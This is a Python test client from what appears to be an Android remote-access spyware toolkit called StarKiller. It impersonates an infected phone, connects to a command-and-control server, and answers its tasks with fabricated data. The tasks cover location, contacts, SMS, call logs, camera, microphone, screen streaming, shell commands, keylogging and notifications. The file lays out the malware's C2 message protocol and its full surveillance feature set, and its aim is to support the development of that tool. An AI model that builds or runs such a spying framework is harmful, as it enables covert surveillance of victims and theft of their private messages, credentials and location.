"""
STARKILLER TEST CLIENT — Simulates Android agent over TCP
22DIV / george wu

Connects to C2, registers as fake device, responds to tasks.
Use to test the GUI listener without a real phone.

Usage:
    python test_client.py                    # connect to localhost:8667
    python test_client.py --ip 192.168.1.92  # connect to remote C2
    python test_client.py --interactive      # manual command mode
"""
import os
import sys
import json
import socket
import struct
import threading
import time
import uuid
import base64
import random
import argparse

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

R = "\033[91m"
G = "\033[92m"
A = "\033[93m"
B = "\033[94m"
P = "\033[95m"
D = "\033[90m"
W = "\033[97m"
X = "\033[0m"


def send_msg(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def recv_msg(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    if length > 10 * 1024 * 1024:
        return None
    body = b""
    while len(body) < length:
        chunk = sock.recv(min(65536, length - len(body)))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode("utf-8"))


FAKE_CONTACTS = [
    {"name": "Raed Khalil", "number": "+61412345678"},
    {"name": "Mum", "number": "+61498765432"},
    {"name": "J", "number": "+61400111222"},
    {"name": "Shaun TAFE", "number": "+61433999888"},
]

FAKE_SMS = [
    {"from": "+61412345678", "body": "Job tomorrow 7am Parramatta site", "date": "2026-06-23 08:15"},
    {"from": "+61498765432", "body": "Dinner at 6", "date": "2026-06-23 12:30"},
    {"from": "+61400111222", "body": "hey u up", "date": "2026-06-22 23:45"},
]

FAKE_APPS = [
    "com.cogos18.ShaunPro", "com.instagram.android", "com.discord",
    "com.whatsapp", "com.google.android.gm", "com.android.chrome",
    "com.spotify.music", "com.snapchat.android", "au.com.commbank.commbiz",
]

FAKE_CALLLOG = [
    {"number": "+61412345678", "type": "incoming", "duration": 142, "date": "2026-06-23 09:00"},
    {"number": "+61498765432", "type": "outgoing", "duration": 45, "date": "2026-06-22 18:30"},
    {"number": "+61400111222", "type": "missed", "duration": 0, "date": "2026-06-22 23:50"},
]


def generate_fake_screenshot():
    try:
        from PIL import Image
        img = Image.new("RGB", (1080, 2340), color=(18, 18, 24))
        from PIL import ImageDraw
        draw = ImageDraw.Draw(img)
        draw.rectangle([0, 0, 1080, 80], fill=(30, 30, 40))
        draw.text((20, 25), "12:34    LTE    87%", fill=(200, 200, 200))
        draw.rectangle([40, 200, 1040, 400], fill=(26, 26, 36))
        draw.text((60, 280), "ElevateHorizonConnect", fill=(255, 68, 68))
        draw.rectangle([40, 440, 1040, 540], fill=(26, 26, 36))
        draw.text((60, 475), "StarKiller Service Running", fill=(0, 255, 65))
        for i in range(4):
            y = 600 + i * 120
            draw.rectangle([40, y, 1040, y + 100], fill=(20, 20, 30))
            draw.text((60, y + 35), f"App {i+1}", fill=(180, 180, 180))
        draw.rectangle([0, 2240, 1080, 2340], fill=(30, 30, 40))
        draw.text((200, 2270), "< Home   [] Recent", fill=(150, 150, 150))

        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        return buf.getvalue()
    except ImportError:
        return b"\xff\xd8\xff\xe0" + b"\x00" * 100


try:
    import io
except ImportError:
    pass


def handle_task(sock, task, agent_id, verbose=False):
    op = task.get("op", "")
    task_id = task.get("task_id", "?")

    if verbose:
        print(f"  {A}[<]{X} Task received: {P}{op}{X} (id={task_id})")
        print(f"      {D}Full payload: {json.dumps(task, indent=2)[:300]}{X}")

    result_data = {}

    if op == "sysinfo":
        result_data = {
            "device": "Samsung Galaxy S24 Ultra",
            "os": "Android 15",
            "sdk": 35,
            "manufacturer": "samsung",
            "model": "SM-S928B",
            "carrier": "Telstra",
            "battery": random.randint(20, 95),
            "wifi_ssid": "RADON_OFFICE_5G",
            "ip_local": "192.168.1.155",
            "screen": "1440x3088",
            "root": False,
            "uptime_hours": round(random.uniform(1, 72), 1),
        }

    elif op == "gps":
        result_data = {
            "latitude": -33.8688 + random.uniform(-0.01, 0.01),
            "longitude": 151.2093 + random.uniform(-0.01, 0.01),
            "accuracy": round(random.uniform(3, 25), 1),
            "provider": "fused",
        }

    elif op == "contacts":
        result_data = {"contacts": FAKE_CONTACTS, "count": len(FAKE_CONTACTS)}

    elif op == "sms_read":
        result_data = {"messages": FAKE_SMS, "count": len(FAKE_SMS)}

    elif op == "calllog":
        result_data = {"calls": FAKE_CALLLOG, "count": len(FAKE_CALLLOG)}

    elif op == "apps":
        result_data = {"packages": FAKE_APPS, "count": len(FAKE_APPS)}

    elif op == "camera":
        result_data = {"status": "captured", "camera": task.get("camera", "rear"), "size": 245000}

    elif op == "mic":
        dur = task.get("duration", 10)
        if verbose:
            print(f"  {D}    Simulating {dur}s recording...{X}")
        time.sleep(min(dur, 3))
        result_data = {"status": "recorded", "duration": dur, "size": dur * 16000}

    elif op == "screenshot":
        screenshot_bytes = generate_fake_screenshot()
        result_data = {
            "frame": base64.b64encode(screenshot_bytes).decode(),
            "width": 1080,
            "height": 2340,
        }
        if verbose:
            print(f"  {G}    Screenshot generated: {len(screenshot_bytes)} bytes{X}")

    elif op == "vnc":
        frames = task.get("frames", 5)
        interval_ms = task.get("interval", 500)
        if verbose:
            print(f"  {G}    VNC stream: {frames} frames at {interval_ms}ms{X}")
        for i in range(min(frames, 20)):
            screenshot_bytes = generate_fake_screenshot()
            frame_result = {
                "type": "result",
                "agent_id": agent_id,
                "task_id": task_id,
                "data": {
                    "frame": base64.b64encode(screenshot_bytes).decode(),
                    "frame_num": i + 1,
                    "total": frames,
                },
            }
            try:
                send_msg(sock, frame_result)
                if verbose:
                    print(f"  {D}    Frame {i+1}/{frames} sent{X}")
            except Exception as e:
                if verbose:
                    print(f"  {R}    Frame send error: {e}{X}")
                break
            time.sleep(interval_ms / 1000.0)
        return

    elif op == "exec":
        cmd = task.get("cmd", "")
        if verbose:
            print(f"  {D}    Executing: {cmd}{X}")
        if cmd == "whoami":
            result_data = {"output": "u0_a155", "exit_code": 0}
        elif cmd == "id":
            result_data = {"output": "uid=10155(u0_a155) gid=10155(u0_a155)", "exit_code": 0}
        elif cmd == "pwd":
            result_data = {"output": "/data/data/com.cogos18.ShaunPro", "exit_code": 0}
        elif cmd == "ls":
            result_data = {"output": "cache\ncode_cache\nfiles\nshared_prefs", "exit_code": 0}
        elif cmd == "uname -a":
            result_data = {"output": "Linux localhost 6.1.75-android14-11-gb3602c5 #1 SMP aarch64", "exit_code": 0}
        elif cmd == "cat /proc/version":
            result_data = {"output": "Linux version 6.1.75-android14-11-gb3602c5", "exit_code": 0}
        elif cmd == "getprop ro.build.fingerprint":
            result_data = {"output": "samsung/e3sxxx/e3s:15/AP3A.241005.015/S928BXXS4AXL2:user/release-keys", "exit_code": 0}
        else:
            result_data = {"output": f"sh: {cmd.split()[0]}: not found", "exit_code": 127}

    elif op == "ls":
        path = task.get("path", "/sdcard")
        result_data = {
            "path": path,
            "files": [
                {"name": "DCIM", "type": "dir", "size": 0},
                {"name": "Download", "type": "dir", "size": 0},
                {"name": "Documents", "type": "dir", "size": 0},
                {"name": "Pictures", "type": "dir", "size": 0},
                {"name": "screenshot_2026.png", "type": "file", "size": 245000},
                {"name": "notes.txt", "type": "file", "size": 1200},
            ],
        }

    elif op == "keylog":
        result_data = {
            "buffer": "password123\nwww.google.com\nhello bro\n",
            "entries": 3,
        }

    elif op == "notifs":
        result_data = {
            "notifications": [
                {"app": "com.whatsapp", "title": "J", "text": "hey u up", "time": "23:45"},
                {"app": "com.google.android.gm", "title": "TAFE NSW", "text": "Assessment reminder", "time": "09:00"},
            ],
            "count": 2,
        }

    elif op == "ping":
        result_data = {"pong": True, "timestamp": int(time.time())}

    elif op == "screen_grant":
        result_data = {"granted": True}

    else:
        result_data = {"error": f"Unknown op: {op}"}
        if verbose:
            print(f"  {R}    Unknown operation: {op}{X}")

    result = {
        "type": "result",
        "agent_id": agent_id,
        "task_id": task_id,
        "data": result_data,
    }
    send_msg(sock, result)
    if verbose:
        preview = json.dumps(result_data)[:200]
        print(f"  {G}[>]{X} Result sent: {preview}")


def heartbeat_loop(sock, agent_id, verbose=False):
    while True:
        try:
            time.sleep(30)
            hb = {
                "type": "heartbeat",
                "agent_id": agent_id,
                "battery": random.randint(15, 95),
            }
            send_msg(sock, hb)
            if verbose:
                print(f"  {D}[~] Heartbeat sent (battery={hb['battery']}%){X}")
        except Exception:
            break


def main():
    parser = argparse.ArgumentParser(description="StarKiller Test Client")
    parser.add_argument("--ip", default="127.0.0.1", help="C2 server IP")
    parser.add_argument("--port", type=int, default=8667, help="C2 agent port")
    parser.add_argument("--interactive", "-i", action="store_true", help="Interactive mode")
    parser.add_argument("--verbose", "-v", action="store_true", default=True, help="Verbose output")
    parser.add_argument("--device", default="SM-S928B", help="Fake device model")
    parser.add_argument("--name", default="test-device", help="Fake hostname")
    args = parser.parse_args()

    agent_id = uuid.uuid4().hex[:8]

    print(f"""
{R}  STARKILLER TEST CLIENT{X}
{D}  --------------------------------{X}
{D}  Target:{X}  {W}{args.ip}:{args.port}{X}
{D}  Agent:{X}   {W}{agent_id}{X}
{D}  Device:{X}  {W}{args.device}{X}
{D}  Mode:{X}    {W}{'interactive' if args.interactive else 'passive'}{X}
{D}  --------------------------------{X}
""")

    print(f"  {A}[~]{X} Connecting to {args.ip}:{args.port}...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((args.ip, args.port))
        sock.settimeout(None)
    except Exception as e:
        print(f"  {R}[!]{X} Connection failed: {e}")
        print(f"  {D}    Make sure the C2 is running: python starkiller_gui.py{X}")
        sys.exit(1)

    print(f"  {G}[+]{X} Connected!")

    reg = {
        "type": "register",
        "agent_id": agent_id,
        "hostname": args.name,
        "username": "u0_a155",
        "os": "Android 15",
        "platform": "android",
        "model": args.device,
        "carrier": "Telstra",
        "battery": str(random.randint(40, 95)),
        "arch": "aarch64",
        "ip": "192.168.1.155",
    }
    send_msg(sock, reg)
    print(f"  {G}[+]{X} Registered as {args.device} ({agent_id})")

    threading.Thread(target=heartbeat_loop, args=(sock, agent_id, args.verbose), daemon=True).start()

    print(f"  {G}[*]{X} Listening for tasks...")
    print(f"  {D}    Select this agent in the GUI and click an operation{X}")
    if args.interactive:
        print(f"  {D}    Type 'quit' to disconnect{X}")
    print()

    def recv_loop():
        while True:
            try:
                msg = recv_msg(sock)
                if msg is None:
                    print(f"\n  {R}[!]{X} Server disconnected")
                    break

                msg_type = msg.get("type", "")
                if msg_type == "task":
                    handle_task(sock, msg, agent_id, verbose=args.verbose)
                else:
                    if args.verbose:
                        print(f"  {D}[?] Unknown message type: {msg_type}{X}")
                        print(f"      {json.dumps(msg)[:200]}")
            except Exception as e:
                print(f"\n  {R}[!]{X} Recv error: {e}")
                break

        print(f"  {D}[*] Recv loop ended{X}")
        os._exit(0)

    recv_thread = threading.Thread(target=recv_loop, daemon=True)
    recv_thread.start()

    if args.interactive:
        try:
            while True:
                cmd = input(f"  {P}>{X} ").strip()
                if cmd in ("quit", "exit", "q"):
                    break
                elif cmd == "help":
                    print(f"  {D}Commands: quit, send <json>, output <text>, status{X}")
                elif cmd.startswith("output "):
                    send_msg(sock, {"type": "output", "agent_id": agent_id, "line": cmd[7:]})
                elif cmd.startswith("send "):
                    try:
                        data = json.loads(cmd[5:])
                        send_msg(sock, data)
                    except json.JSONDecodeError as e:
                        print(f"  {R}Invalid JSON: {e}{X}")
                elif cmd == "status":
                    print(f"  {G}Connected{X} as {agent_id} to {args.ip}:{args.port}")
                elif cmd:
                    send_msg(sock, {"type": "output", "agent_id": agent_id, "line": cmd})
        except (KeyboardInterrupt, EOFError):
            pass
    else:
        try:
            recv_thread.join()
        except KeyboardInterrupt:
            pass

    print(f"\n  {D}[*] Disconnecting...{X}")
    try:
        sock.close()
    except Exception:
        pass


if __name__ == "__main__":
    main()
